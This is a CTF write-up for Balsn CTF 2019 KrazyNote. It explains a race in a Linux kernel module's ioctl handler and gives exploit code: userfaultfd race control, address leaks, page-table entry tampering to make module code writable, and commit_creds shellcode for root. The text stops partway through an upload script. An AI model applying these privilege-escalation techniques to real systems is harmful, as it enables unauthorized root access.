---
layout: post
title: Balsn CTF 2019 - KrazyNote
date: 2019-10-10
categories: ctf
---
I solved a challenge called KrazyNote on Balsn CTF 2019. As expected, Balsn CTF was extremely hard, and the pwnable challenge with the most solves was KrazyNote. It had about 10 solves, which is quite a lot but I learned a lot of important stuff through this challenge so I decided to publish a write-up for it.

It was my first time doing a non-userspace pwn challenge in a CTF, so I did a lot of stupid and useless things and wasted a lot of time. I spent about 30 hours, including sleep and break for this challenge.

My goal is to try to describe the solving process as detailed as possible, so that people who don't have experience in kernel exploitation can understand it as well. I will also add links to resources I've used to solve it.

And most importantly, [this](https://github.com/pr0cf5/CTF-writeups/blob/master/2019/BalsnCTF/knote/exploit.c) is my exploit code for reference.

## Some Background Information

### 1. task_struct and cred_struct

The essence of kernel pwning is not so different from userspace pwning. With flaws in the program, we get arbitrary memory read/write or control flow hijack and do what we want. However, the final goal of kernel exploitation is different from that of userspace exploitation.

In userspace, our final goal is to execute `system("/bin/sh")` usually. In kernel space, exploitation goal is to get uid0. There are many ways to do this, but two methods are common:

```
1. overwrite the data structure that stores uid, gid, euid, ... to 0
2. execute commit_cred(prepare_kernel_creds(0))
```

In the linux kernel, every user process (and thread) is actually a kernel thread. When a process executes a system call or an interrupt instruction, it switches to kernel mode and executes kernel code, and afterwards returns back to user mode. Each kernel thread's information, such as credentials (uid), execution state, ptrace information, ...etc is saved at a structure at the bottom of each threads' stack. It is called the `task_struct` structure. Inside the `task_struct` there is a pointer to a `cred_struct`, which stores the user credentials. The `cred_struct` is allocated via kmalloc, so it is a heap pointer.

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
```

So if we have arbitrary memory read/write and we can locate a cred structure for a particular process, we can make its uid become 0. 

Another way is to execute the code `commit_cred(prepare_kernel_creds(0))`. Basically this will automatically locate the task_struct of the current thread and change its cred_struct to a new one with uid 0.

### 2. kernel memory protections

On modern operating system, kernelspace and userspace is strictly separated. Obviously, userspace programs should not have access to kernel memory. The opposite is a bit ambiguous. There are definitely instances where kernel code must access data in userland, such as in a system call, where the system call must read or write to userland addresses.

If we have the primitive of overwriting a function pointer in kernel space, how would you exploit it? In userspace exploits when we had RIP control we called these exploit techniques return-to-something, such as in return-to-shellcode, return-to-libc, or return-oriented-programming. In kernelspace, we can think of something like return-to-userspace. Basically it means by controlling RIP in kernelspace we can force it to jump to code in userspace, which is user-controllable. We can place a shellcode that does `commit_cred(prepare_kernel_creds(0))` in address 0xdead000 and change a function pointer 0xdead000 and trigger it. 

A good mitigation against this kind of exploit is SMEP. (supervisor mode execution prevention) As you can infer from its acronym, it prevents the execution of data in usermode from kernelspace. 

To bypass this, hackers thought of kernel ROP, where the function pointer is overwritten to gadget that changes the stack pointer to a userspace address, (stack pivot) To protect against kernel ROP attacks, SMAP (supervisor mode access prevention) was introduced. This prevents dereferencing userspace addresses directly from kernel space.

One question should emerge: in system calls sometimes kernel code must fetch data from userspace. Under SMAP, how should this be done? It is done with a special API called `copy_from_user` and `copy_to_user`. It works very similarly to `memcpy` except it overrides SMEP/SMAP and has many underlying, complex memory mechanisms.

### 3. paging and virtual memory

In modern systems an ingenious abstraction called virtual memory is applied. The core concepts are long enough to explain in a book, I'll only be explaining the basics.

The kernel stores memory in mainly two regions: RAM and the swap partition. Memory that will be used right now will be stored in the RAM, and memory that will not be used right now will be 'swapped out' to the swap parition. The swapping in and swapping out is managed by the kernel.

If the memory is stored in RAM, the kernel must find a way to locate it within RAM. The offset of data within RAM is called a physical address. 

However, for many reasons programs do not use physical addresses. They use virtual addresses, and each virtual address corresponds to a physical address. The data structure that tells the relationship between a virtual address and a physical address is called a page table. Basically a page table is a lookup table for virtual addresses.

A page is a unit of virtual memory, which is normally 0x1000 bytes. A frame is a unit of physical memory, which is also 0x1000 bytes. In a page table each virtual page is mapped to a physical frame. Since x64 has `2**64` different addresses, there can be a total of `2**52` pages. That means a page table must have `2**52` entires, which is too huge. 

To prevent the page table from being too huge, people thought of something called multi-level paging. The basic idea is similar to a tree-based-search. Each page table entry points to a lower-level page table instead of pointing to the page table itself. You can check [this](https://0xax.gitbooks.io/linux-insides/content/Theory/linux-theory-1.html) out to fully understand multilevel paging.

An important concept here is that each page table entry also contains the page permissions such as READ/WRITE/EXECUTE. Therefore altering page table entires will cause the page table permissions to change.

### 4. Demand on paging and lazy loading

I mentioned that in the kernel some memory is located at disk (swap partition) while oftenly used memory is located at RAM. Actually this is not entirely true, some memory may neither be in those two places. One example is memory mapped pages, which are created via the `mmap` system call. The underlying concepts are complicated, but simply speaking, `mmap`'ed pages aren't actually 'created' before they are accessed via read/write. By 'created' it means that actual physical pages are not mapped for the `mmap`'ed page. This is a wise move because the contents of an `mmap`'ed page can be recovered easily even if the page itself isn't stored somewhere. 

Let's take an example where a user executes a system call like the following.

```
mmap(0xdead000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);
```

In this case, the kernel does not copy the entire contents from the file corresponding to `fd` to 0xdead000; it only saves the information that address 0xdead000 is mapped to file `fd`. When we do something like this:

```
char *a = (char *)0xdead000
printf("content: %c\n", a[0]);
```

A dereference to that page is made. If this happens, the kernel uses the saved information (0xdead000 is mapped to fd) to 1. create a physical frame for 0xdead000, 2. read the contents of file fd to 0xdead000, 3. mark appropriate entires in the page table so virtual address 0xdead000 is recognizable.

In the case of anonymous mappings (such as the heap) it is even more simple. You can change step 2 to 'zero out the contents of the physical frame' instead of reading from a file.

The main point i'm trying to say here is this: **it takes a loooong time to access (r/w) a mmap'ed page for the first time. such long jobs may cause a context switch and sleep the current thread**. This idea will be very important for understanding the exploit.

### 5. Alias pages

All instructions in x86_64 use virtual addresses. There is no ABI to access physical frames directly. But there are definitely instances where the kernel must change a value in a physical frame. One example is walking the multilevel page table and changing a page table entry. To allow kernels to access physical frames, there is a concept called alias pages, meaning that all physical frames have a corresponding virtual page. This mapping is enscribed to the page table at boot and exists in the page table of every process. So most physical frames have two virtual pages mapped to it, that is where the term 'alias' came from. Usually the address of an alias page is `SOME_OFFSET + physical address`.

## Analysis
We are given four files, `initramfs.cpio.gz`, 'bzImage', 'run.sh' and 'note.ko'. Let's first look at `run.sh`, it is the bash script that turns on the qemu vm.

```bash
#!/bin/bash
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel ./bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
    -monitor /dev/null \
    -initrd ./initramfs.cpio.gz  \
    -smp cores=4,threads=4 \
    -cpu kvm64,smep,smap \
```

Basically the script executes `qemu-system-x86_64` with a lot of arguments. The first one is the `-m` option, which specifies the memory size. In this case, it is 128MB. The `-kernel` option specifies the kernel image file, which in this case is the bzImage file provided. Now we know the bzImage file is the kernel image. Doing `file ./bzImage` shows us `bzImage: Linux kernel x86 boot executable bzImage, version 5.1.9 (billy@Billy) #1 SMP Fri Jun 14 17:32:01 CST 2019, RO-rootFS, swap_dev 0x5, Normal VGA`, which proves we are right. The `-initrd` option specifies the initial filesystem, which is `initramfs.cpio.gz`. Basically, it is a compressed root filesystem, whose format is CPIO. Like any compression formats such as ZIP or RAR we can decompress CPIO files using archive utility in ubuntu desktop. You can also use the following script as well.

```bash
#!/bin/sh
mkdir -p initramfs
cd initramfs
gzip -cd ../initramfs.cpio.gz | cpio -imd --quiet
```

Basically this script puts all the contents of initramfs.cpio.gz to the initramfs directory. 

In the filesystem, there aren't that many important files, but there are a few notable points.

```
1. basic utilities such as gzip, sha256sum, strings, ... are provided in the /bin directory
2. glibc and pthread libraries as well as gcc is not provided.
3. In the /home/note directory there is the file note.ko, which is identical to the one provided to us.
4. There is the file /etc/init.d/rcS which looks like it is custom-written.
5. There are two users, root and note. root has uid 0 and note has uid 1000. note does not have read access to the /flag file.
```

The content of the /etc/init.d/rcS file is the follwing:
```bash
#!/bin/sh

mount -t proc none /proc
mount -t devtmpfs none /dev
mkdir /dev/pts
mount /dev/pts

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict
cd /home/note
insmod note.ko
chmod 644 /dev/note
setsid cttyhack setuidgid 1000 sh
poweroff -f
```

It mounts procfs, devfs, disables dmesg and kptr and `insmod`'s note.ko. Insmod means install-module, which is installing a LKM (Linux-Kernel-Mdoule). A Linux-Kernel-Module is a piece of code that can be added to kernelspace, and there are many purposes for this. It can be used to implemenet a character device driver(ptmx, urandom, null), a virtual filesystem, or a network driver. In this case, note.ko is a kernel module used to implement a character device driver. (which cannot be directly realized just by looking at the rcS file but most CTF challenges test us to pwn character device drivers because they are simple to implement and understand) LKMs are also widely used for implementing rootkits and kernel backdoors, so it is an important concept in linux information security. 

Afterwards it spawns a shell with uidgid 1000, so we can't read the flag with this shell. We need to gain root by pwning the LKM, and probably we need to change our creds to uid0 or get ring0 ACE (Arbitrary-Code-Execution) and do `commit_cred(prepare_kernel_creds(0))`. (note.ko) 

Just like we do in any other pwn challenge, we analyze the provided file for vulnerabilites. First we look at the `module_init` function in note.ko. As implied in its name, this function should be called when the module is initialized. The logic is very simple.

```c
void init_module()
{
  bufPtr = bufStart;
  return misc_register(&dev);
}
```

It initializes a global `char *` pointer to the address of a `char[]` buffer, and calls `misc_register` with a global structure, `dev`. `misc_register` is an external call, it is probably within the code of the linux kernel. We check its API documentation to figure out what it does, as well as what `dev` is. With a brief google search, we get [this](https://www.kernel.org/doc/htmldocs/kernel-api/API-misc-register.html) page, which tells us that `dev` is a `struct miscdevice` structure. In memory, `dev` looks something like this:


```c
struct ??? {
	int a; /* initialized to 0 */
	char *b; /* a pointer to "note". */
	void *c; /* a pointer to something that looks like a function table */
};
```

More google search and we get this:

```c
struct miscdevice  {
	int minor;
	const char *name;
	const struct file_operations *fops;
	struct list_head list;
	struct device *parent;
	struct device *this_device;
	const struct attribute_group **groups;
	const char *nodename;
	umode_t mode;
};
```

So a is `minor`, b is `name`, and c is `fops`, which looks like this:

```c
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
	int (*iopoll)(struct kiocb *kiocb, bool spin);
	int (*iterate) (struct file *, struct dir_context *);
	int (*iterate_shared) (struct file *, struct dir_context *);
	__poll_t (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	
	... truncated
};
```
One thing about linux kernel module analysis is that there are so many huge structures which are sometimes nested. Google search is always good for these recursive structures. 
From the `file_operations` structure above, we can check that only `open` and `unlocked_ioctl` is defined for the module, and all else is set to NULL. 

But what's the difference between `unlocked_ioctl` and `compat_ioctl`? You can check [here](https://unix.stackexchange.com/questions/4711/what-is-the-difference-between-ioctl-unlocked-ioctl-and-compat-ioctl) for a better explanantion. Basically, `unlocked_ioctl` does not use a global synchronization lock provided by the linux kernel, and all synchorinzation primitives must be implemented by the module author. This is a very important hint: there may be race conditions in the LKM.


As the name suggests, the kernel module does things related to notes, which were all in the `unlocked_ioctl` handler. Therefore, it had the 4 features in any note CTF challenge: make, edit, view, delete. Let's look at them each.

```c
void * unlocked_ioctl(file *f, int operation, void *userPtr)
{
  char encBuffer[0x20];
  struct noteRequest req;

  memset(encBuffer, 0, sizeof(encBuffer));
  if ( copy_from_user(&req, userPtr, sizeof(req)) )
    return -14;
  /* make note, view note, edit note, delete note */
  return result;
}
```

The type of note operation is determined by the argument operation (for example, when `operation == -255` it does `edit note`) and other additional information (note length, note content) is given via the req structure in userspace, which is pointed by userPtr as the third argument.

Let's take a look at how a new note is made.
```c
	if ( operation == -256 )
	{
		idx = 0;
		while ( 1 )
		{
		  if (!notes[idx])
			break;
		if (++idx == 16)
			return -14LL;
		}

	new = (note *)bufPtr;
	req.noteIndex = idx;
	notes[idx] = (struct note *)bufPtr;
	new->length = req.noteLength;
	new->key = *(void **)(*(void **)(__readgsqword((unsigned __int64)&current_task) + 0x7E8) + 80);// ????
	bufPtr = &new->content[req.length];

	if ( req.length > 0x100uLL )
	{
	  _warn_printk("Buffer overflow detected (%d < %lu)!\n", 256LL, req.length);
	  BUG();
	}

	_check_object_size(encBuffer, req.length, 0LL);
	copy_from_user(encBuffer, userptr, req.length);
	length = req.length;

	if ( req.length )
	{
	  i = 0LL;
	  do
	  {
	    encBuffer[i / 8] ^= new->key;         // encryption
	    i += 8LL;
	  }
	  while ( i < length );
	}

	memcpy(new->content, encBuffer, length);
	new->contentPtr = &new->content[-page_offset_base];
	return 0;
```

The logic is simple. First it allocates space from bufPtr to make a new note. Then it fetches the key from a nested structure in `current_task` which is the `task_struct` which we've discussed previously. We're not sure what it is for now, but by debugging I checked that it's a pointer to a kernel heap address. (How I attached a debugger to it will be explained later) Then it XOR encrypts its content with the key and copies it to the note's inline buffer. Finally, it stores the value &note->content - page_offset_base. I have never seen any pattern like this (storing a pointer subtracted to another pointer which is irrelevant). I just speculated that it's a compiler autogenerated feature or kernel pointer protection mechanism of any sort.

There are a few unresolved questions. First, what's the `key` value? It's hard to figure that out because it's hard to find what's at offset 0x7e8 in the `task_struct`. Linux kernel structures are often heavily nested, and it's nearly impossible to do `offsetof` just by looking at the source with your head. So at first I just gave up, thinking it's unimportant. Second, what is `page_offset_base`? After a bit of experiments and research, I came to this conclusion. Remember alias pages? I said that the address of an alias page is `SOME_OFFSET + physical address`. `page_offset_base` is the `SOME_OFFSET`. In nokaslr environment, `page_offset_base` is a fixed value, and in a kaslr environment `page_offset_base` is a randomzied value.

Let's take a look at delete.
```c
ptr = notes;
if (operation == -253)
{
do                  
{
  *ptr = 0LL;
  ++ptr;
}
while (ptr < note_end);

bufPtr = bufStart;
memset(bufStart, 0, sizeof(bufStart)); 	
return 0;
```

It's simple. First we zero out the notes array, set bufPtr to the start of the global buffer, and zero out the global buffer to prevent infoleaks.

Let's look at edit.
```c
if (operation == -255)
{
	note = notes[idx];
	if ( note )
	{
	length = note->length;
	userptr = req.userptr;
	contentPtr = (note->contentPtr + page_offset_base);
	_check_object_size(encBuffer, length, 0LL);
	copy_from_user(encBuffer, userptr, length);
	if ( length )
		{
			i = 0;
			do
			{
			  encBuffer[i/8] ^= note->key;
			  i += 8LL;
			}
			while (length > i);                    
			memcpy(contentPtr, encBuffer, length)
		}
	return 0LL;
	}
}
```

It's pretty much what we can expect. But what we should really see is the `copy_from_user` usage. It can be used to increase the success of our race, because as I said, `copy_from_user` is an heavy operation. Let's imagine a situation like the following.

|               thread 1              |          thread 2         |
|:-----------------------------------:|:-------------------------:|
|       edit note 0 (size 0xf0)       |            idle           |
|            copy_from_user           |            idle           |
|                 idle                |      delete all notes     |
|                 idle                | add note 0 with size 0x20 |
|                 idle                | add note 1 with size 0x20 |
| continue edit of note 0 (size 0xf0) |            idle           |

The last operation, change content of note 0 will overflow note 1, because the edit length is 0xf0. With this, we can forge an arbitrary note structure.


## Exploitation Plans

A note structure looks like the follwing:
```c
struct note {
	unsigned long key;
	unsigned char length;
	void *contentPtr;
	char content[];
}
```

If we can forge an arbitrary note, it is obvious that we have arbitrary memory read/write. But before that we must leak a kernel pointer, since kaslr is enabled. As I mentioned before, the value `key` is a kernel pointer. If we leak a key value, we get a kernel pointer. 

So first, we attempt to leak the key value. This can be done easily.

|  0x0 | note 0, with abnormal size 0xf0 |
|:----:|:-------------------------------:|
| 0x20 |              note 1             |
| 0x40 |         NULL'ed out data        |

If we try to view note 0, it will decrpyt the NULL'ed out data as well, and XORing with 0 yields the original value, so we can leak the key.

Now that we know the key, we can get the exact value of the `contentPtr`. However, `contentPtr` is actually not a real pointer; to make it a real pointer we must add the value `page_base_offset` which is unknown due to kaslr. However we can do arbitrary read/writes relative to the `.bss` of the module. Therefore, we can leak the module base by reading a pointer to a note structure from the `notes` array.

With some math, it becomes possible to get the exact value of `page_base_offset`. Now we know a lot of addresses, but how about the kernel image base? The kernel image base does not have a static offset with the module. We can find the kernel image base by analyzing recursive calls to external functions such as `copy_from_user` of `copy_to_user`.

Let's take a look at how kernel extern calls are made.
`6C                 call    _copy_from_user`

Analyzing where it jumps to points to a literally pointless location in the .extern segment. I thought that this code may be altered at runtime, and checked it in the debugger. It showed a relative jump to `copy_from_user`. By analyzing the code at offset 0x6c and if we know the module base, we can find out the address of `copy_from_user`, and therefore the kernel base.

So we did something like this:
```c
unsigned long leak = read64(0x6c + moduleBase);
long int offset = *((int *)(((char *)&leak) + 1)) + 5;
copy_from_user = offset + moduleBase + 0x6c;
```

First we read the code at offset 0x6c. Then, we isolate the 32bit imm from the jump instruction and add it to the current pc so that we can get the exact address of `copy_from_user`.


## Debugging

If we get leaks, we need to check that the data we leaked is what we think it is. For effective debugging, there are 2 recommendations.

```
1. set uid to 0 so that we have access to /proc/kallsyms and /proc/modules
2. disable kaslr
```

1 can be done by changing the init script in the initramfs. Change the init script line that looks something like this `setsid cttyhack setuidgid 1000 sh` to `setsid cttyhack setuidgid 0 sh`. Now on boot, you will get a root shell, not a uid1000 shell.

2 can be done by editing `run.sh`. Change `-append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr'` to `-append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr'`. 

Now on boot, with kaslr disabled you will get a root shell. Now you can read the two files `/proc/kallsyms` and `/proc/modules`. `/proc/kallsyms` is shows the addresses for all the symbols in the kernel. `/proc/modules` show how kernel modules are mapped to kernel virutal memory. By looking at `/proc/modules` we can verify if the module base we calculated is equal to the actual base address in `/proc/moduels`. (The below is an example)

```
note 24576 0 - Live 0xffffffffc0000000 (OE)
```

We can also verify the address of `copy_from_user` by doing `cat /proc/kallsyms | grep copy_from_user`.
```
/home/note # cat /proc/kallsyms | grep copy_from_user
ffffffff8874d890 T iov_iter_copy_from_user_atomic
ffffffff887518a0 t kfifo_copy_from_user.isra.2
ffffffff88753e80 T _copy_from_user
ffffffff88a060d0 T csum_partial_copy_from_user
ffffffff88a086b0 T copy_from_user_nmi
ffffffff892c71a8 r __ksymtab__copy_from_user
ffffffff892c8148 r __ksymtab_csum_partial_copy_from_user
ffffffff892c9a28 r __ksymtab_iov_iter_copy_from_user_atomic
ffffffff892ce238 r __ksymtab_copy_from_user_nmi
ffffffff892e2a92 r __kstrtab_iov_iter_copy_from_user_atomic
ffffffff892e314c r __kstrtab__copy_from_user
ffffffff892f71b8 r __kstrtab_csum_partial_copy_from_user
ffffffff892f741c r __kstrtab_copy_from_user_nmi
```

For dynamic debugging, we can attach a remote debugger via qemu gdbstub. We can do this by providing a `-s` argument to the `run.sh` script, open gdb in another terminal and execute `target remote localhost:1234`. One thing to be cautious is to not trust `vmmap`, because mappings are not accurate as in userspace programs. Since from some reason, setting breakpoints by symbols does not work, we disable KASLR, find symbols using kallsyms, and set breakpoints with the raw addresses. A good practice is to put all the gdb commands in a script and execute them all at once using the gdb `source` command.

## Actual Exploit

Now we have the module base, kernel image base and page_base_offset. We have very stable arbitrary read and write. If this was a userspace pwnable, it would be very easy to finish it off. However, I was a noob in kernel sploits and didn't know what to do. I tried to locate the task structure or cred structure, but failed. Here are some attempts I wasted lots of time on.
```
1. create a lot of threads, scan the kernel memory starting from page_offset_base and try to find 3 consecutive 1000s. This idea comes from the fact that the cred structure has 3 consecutive members that are 1000. (uid, gid, euid)
2. iterate the list of threads, starting from init_thread which is located at the kernel image .data. Since we have arbitrary read, it is possible to iterate the list.
```

Both attempts did not work. I don't know why the first one did not work, theoretically it should work. Maybe it's because the scan domain was way too big? The 2nd method did not work for one reason: we don't know how the `task_struct` looks like. For sure, we can check its struct in the source code and header files, but it's hard to find the exact offsets because of nested structures. Therefore, after a lot of thinking I decided to do something like the following:

```
1. compile a kernel module like the following.
2. disassemble the kernel module to find out the offsets I want.
```

Here is an example. [This](https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234) is my reference.

```c
#include <linux/module.h>     /* Needed by all modules */ 
#include <linux/kernel.h>     /* Needed for KERN_INFO */ 
#include <linux/init.h>       /* Needed for the macros */
#include <linux/sched.h> 
#include <stddef.h>
  
///< The license type -- this affects runtime behavior 
MODULE_LICENSE("GPL"); 
  ///< The description -- see modinfo 
MODULE_DESCRIPTION("A simple Hello world LKM!"); 
  
///< The version of the module 
MODULE_VERSION("0.1"); 
  
static int __init hello_start(void) 
{ 
    printk(KERN_INFO "Loading hello module...\n"); 
    printk(KERN_INFO "Hello world\n"); 
    return 0; 
} 
  
static void __exit hello_end(void) 
{ 
    printk(KERN_INFO "offset: %p\n", offsetof(struct mm_struct, pgd));
    printk(KERN_INFO "Goodbye Mr.\n"); 
    printk(KERN_INFO "haha\n");
} 
  
module_init(hello_start); 
module_exit(hello_end); 
```

and the makefile

```make
obj-m = hello.o
all:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

There may be a subtle difference between the offsets, but we can adjust these minimal differences via inspection with a debugger.

## Using userfaultfd to make races reliable

|               thread 1              |          thread 2         |
|:-----------------------------------:|:-------------------------:|
|       edit note 0 (size 0xf0)       |            idle           |
|            copy_from_user           |            idle           |
|                 idle                |      delete all notes     |
|                 idle                | add note 0 with size 0x20 |
|                 idle                | add note 1 with size 0x20 |
| continue edit of note 0 (size 0xf0) |            idle           |

Remember that this must happen, at the exact order. We can hope that things will work out for us and try again and again, but it's not a reliable solution. I did some searching about making races reliable, and came across [this](https://blog.lizzie.io/using-userfaultfd.html) great article.

The basic idea is to use a userfault object, which is an API used to handle page faults in userspace. The interesting thing is that it can handle page faults in kernel code as well. So, if I trigger a page fault in `copy_from_user` or `copy_to_user`, I can make that kernel thread halt, do some things, and continue execution in that thread. This is exactly what I need!

The usage is kinda complicated, but simply it can be summarized into three parts.

```
1. create a userfault fd and tell which addresses it should handle
2. create a thread that will cause the page fault
3. create a poll-loop that will handle the page fault via userfaultfd created in step 1
```

I'll be going through the exact process in another entry, since it's kinda compilcated to shove it in here. userfaultfd is a very interesting feature. However, userfaulfd itself does not introduce any vulnerabilities. The cause of the vulnerability was the usage of `unlocked_ioctl`, and userfaultfd is just there to help my race become exploitable.

So, my plan is this

```
0. create a length 0xf0 note
1. create a userfault fd that looks for page faults at address 0xdead000
2. edit the note created in 0, but make sure the userspace pointer points to an mmapped page at address 0xdead000 (this can be done via MAP_FIXED option)
3. now the editing thread will sleep until we handle the fault
4. delete all notes and create 2 notes with size 0x20
5. handle the page fault, and edit is done now => buffer overflow
6. game over!
```

## Getting the flag

Now we have a few (actually most) known addresses and arbitrary read write. It seems that it's over, but I wasted a lot of time thinking what to do. I tried the `cred_struct` spraying mentioned before but it wasn't that reliable. (about 1/10 success rate?)

Then I decided to think again, iterating over what I did over the last 24 hours. I realized that I haven't resolved what `key` is. It's definitely a pointer, but what is it pointing to?

Then I realized that I could use the method of compiling a kernel module to find offsets of complex structures. With a bunch of trial and error, I could decisively conclude that The value `key` is equivalent to `task_struct.mm->pgd` where `mm` is a `struct mm_struct` and `pgd` is a pointer. Basically the key was the highest level page table, also known as the name `page directory`. 

Sometimes in CTFs, unlike in real-world challenges thinking about the author's intended solution is a shortcut. I wondered why someone would use a page directory address as an encrpytion key. The only reasonable answer to that was that I should corrupt/forge the paging structures. 

How can I profit from corrupting page tables? Remember what I said about page permissions in page table entries? If I can manipulate bits representing R/W/X permissions in page table entires, I can create an RWX page and get ring0 arbitrary code execution very easily. This idea is very similar to `mprotect` ROP stagers in userspace exploitation.

So I created some code to walk page tables, and with some trial and error I made it work.
```c
unsigned long pageTableWalk(unsigned long pgdir, unsigned long vaddr) {
	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;

	printf("index1: %lx, index2: %lx, index3: %lx index4: %lx\n", index1, index2, index3, index4);
	
	unsigned long lv1 = read64(pgdir + index1*8);
	if (!lv1) {
		printf("[!] lv1 is invalid\n");
		exit(-1);
	}
	printf("lv1: %lx\n", lv1);
	unsigned long lv2 = read64(((lv1 >> 12) << 12) + pageOffsetBase + index2*8);
	if (!lv2) {
		printf("[!] lv2 is invalid\n");
		exit(-1);
	}
	printf("lv2: %lx\n", lv2);
	
	unsigned long lv3 = read64(((lv2 >> 12) << 12) + pageOffsetBase + index3*8);
	if (!lv3) {
		printf("[!] lv3 is invalid\n");
		exit(-1);
	}
	printf("lv3: %lx\n", lv3);

	unsigned long lv4 = read64(((lv3 >> 12) << 12) + pageOffsetBase + index4*8);
	if (!lv4) {
		printf("[!] lv3 is invalid\n");
		exit(-1);
	}
	printf("lv4: %lx\n", lv4);
	
	unsigned long vaddr_alias = ((lv4 >> 12) << 12) + pageOffsetBase;
	printf("vaddr alias page: %p\n", (void *)vaddr_alias);
	unsigned long pte_addr = ((lv3 >> 12) << 12) + pageOffsetBase + index4*8;
	printf("pte address: %p\n", (void *)pte_addr);
	
	return pte_addr;
}
```

One thing to notice is that each entry contains the physical address for the lower level page table, so we must add `page_offset_base` to find calculate the virtual address (alias page) for that physical frame. The code above returns the virtual address to the page table entry, so manipulating bits of that entry will change the permissions of that address.

The address I decided to play with is the module base. Originally it only has the EXEC/READ bits, but I give it WRITE as well. This can be done by setting the second least significant bit.

```c
unsigned long pte_addr = pageTableWalk(key, moduleBase);
unsigned long default_pte = read64(pte_addr);
write64(pte_addr, default_pte|2);
```

Now we can overwrite codes of the `open` and `ioctl` handlers. However for arbitrary writes `ioctl` is required so I make sure that `open` jumps to a code below `ioctl`, where I write the `commit_cred(prepare_kernel_creds(0))` shellcode. We don't need to return about returning to user safely, if we make sure the `open` handler returns in the same way its original code did.

Also, the addresses for the symbols `commit_cred` and `prepare_kernel_creds` is resolved dynamically during the exploit, so we can't hard-code shellcode into our exploit. So I 'compiled' it. (sorry to all the compilers in the world...)

```c
void commit_creds_and_return() {
	asm volatile ("xor %rdi, %rdi");
	asm volatile ("mov $0xcccccccccccccccc, %rax");
	asm volatile ("call %rax");
	asm volatile ("mov %rax, %rdi");
	asm volatile ("mov $0xdddddddddddddddd, %rax");
	asm volatile ("call %rax");
}

char shellcode[0x1000];
	memcpy(shellcode, commit_creds_and_return, 0xff);
	for(int i = 0; i < 0xff; i++) {
		unsigned long *pppp = &shellcode[i];
		if (*pppp == 0xcccccccccccccccc) {
			printf("[*] patched prepare_kernel_cred\n");
			*pppp = prepare_kernel_cred;
		}
		if (*pppp == 0xdddddddddddddddd) {
			printf("[*] patched commit_creds\n");
			*pppp = commit_creds;
		}
	}
```

Now calling `open` on `/dev/note` will give us root, and we can get the flag.

## Final shit to overcome

I statically compiled my exploit and used a script to upload my binary. Bascially it gzip compresses my exploit, fragments it to pieces of size 800, b64 encodes it and sends it using `echo` and `cat`. Now, my original exploit was huge, taking about 500 chunks. The script timed out at about 300 chunks.

I thought that `pthread` was the culprit, and replaced `pthread` with `clone`. It reduced to about 400?

Then I applied some gcc optimiziation flags (strip symbols, size optimization) but it still was over 400.

```python
#!/usr/bin/env python2
from pwn import *

def send_command(cmd, print_cmd = True, print_resp = False):
	if print_cmd:
		log.info(cmd)

	p.sendlineafter("$", cmd)
	resp = p.recvuntil("$")

	if print_resp:
		log.info(resp)

	p.unrecv("$")
	return resp

def send_file(name):
	file = read(name)
	f = b64e(file)

	send_command("rm /home/note/a.gz.b64")
	send_command("rm /home/note/a.gz")
	send_command("rm /home/note/a")

	size = 800
	for i in range(len(f)/size + 1):
		log.info("Sending chunk {}/{}".format(i, len(f)/size))
		send_command("echo -n '{}'>>/home/note/a.gz.b64".format(f[i*size:(i+1)*size]), False)

	send_command("cat /home/note/a.gz.b64 | base64 -d > /home/note/a.gz")
	send_command("gzip -d /home/note/a.gz")
	send_command("chmod +x /home/note/a")

def exploit():
	send_file("exploit.gz")
	#send_command("/home/note/a")
	p.sendline("/home/note/a")
	p.interactive()

if __name__ == "__main__":

	#context.log_level = 'debug'
